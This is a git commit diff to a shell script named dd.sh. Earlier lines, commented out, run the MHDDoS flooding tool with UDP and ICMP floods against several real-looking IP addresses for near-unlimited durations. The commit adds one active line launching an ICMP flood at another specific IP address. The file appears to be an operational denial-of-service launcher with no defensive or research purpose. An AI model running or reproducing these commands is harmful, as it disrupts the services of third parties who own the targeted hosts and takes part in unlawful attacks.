b84ea54fd8e38c0e94828a1a3c088a7a4160291b
rxyxxy <80524108+rxyxxy@users.noreply.github.com>
2024-07-22 16:30:11 +0800

    Update dd.sh

--- dd.sh
+++ dd.sh
@@ -5,3 +5,4 @@
 # python3 MHDDoS/start.py ICMP 153.121.71.128:80 1 99999999 true &
 # python3 MHDDoS/start.py UDP 45.154.15.226:80 1 99999999 true
 # python3 MHDDoS/start.py UDP 193.32.149.118:80 1 99999999 true &
+python3 MHDDoS/start.py ICMP 156.238.250.25:80 1 99999999 true &
